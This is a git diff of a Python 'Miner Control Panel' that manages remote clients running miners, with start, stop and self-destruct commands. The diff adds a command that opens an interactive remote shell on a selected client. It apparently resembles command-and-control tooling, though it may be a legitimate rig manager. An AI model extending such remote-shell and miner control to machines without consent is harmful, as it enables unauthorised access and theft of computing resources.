@@ -106,8 +106,9 @@ def manager_handler(addr, index):
     while connected:
         if address_attention == addr:
             print(f'Managing {addr[0]}:{addr[1]}')
-            print('cliget-get all active clients\nstartmine-start miners\nstopmine-stop miners\nselfdestruct-destroy all miners\nback-back to main menu')
+            
             while True:
+                print('cliget-get all active clients\nstartmine-start miners\nstopmine-stop miners\nselfdestruct-destroy all miners\nconnect #- start shell with client\nback-back to main menu')
                 command = input('Enter Command:>')
                 if command == 'cliget':
                     manager.request_info()
@@ -121,6 +122,25 @@ def manager_handler(addr, index):
                     address_attention = None
                     managing = False
                     break
+                elif 'connect' in command:
+                        os.system('cls')
+                        manager.start_shell(command[8])
+                        response = None
+                        print('Type \'stop\' to quit shell')
+                        while True:
+                            if response:
+                                print(response)
+                            inp = input(':>')
+                            manager.send_shell_command(inp)
+                            if inp != 'stop':
+                                response = manager.recieve_shell_response()
+                            else:
+                                break
+                            time.sleep(1)
+                            
+                            
+                        
+                    
                 else:
                     print('Invalid Command.')
                     continue
@@ -172,7 +192,7 @@ def menu():
             status = 'Connected'
         else:
             status = 'Disconnected'
-        print('Miner Control Panel\n--------------------\n1. Show Saved Managers\n2. Show all active clients\n3. Control Manager\n4. Manager Menu\n5. Connect to miner\n')
+        print('Miner Control Panel\n--------------------\n1. Show Saved Managers\n2. Show all active clients\n3. Control Manager\n4. Manager Menu\n\n')
         print(f'[STATUS]: {status}')
         print (f'{len(manager_objects)}/{len(managers)} managers connected')
         inp = input('>')
@@ -197,7 +217,7 @@ def menu():
                             raise ValueError()
                         elif int(i) < 1:
                             raise ValueError()
-                        manage(managers[int(i) - 1])
+                        manage(managers[int(i)-1])
                         break
               
             else:
@@ -239,7 +259,7 @@ def menu():
         elif inp == '5':
             if status == 'Connected':
                 os.system('cls')
-                inp = input(f'Which client to connect to(1-{miner_count}) :>')
+                
                 
             else:
                 print('[ERROR] Not connected to managers')
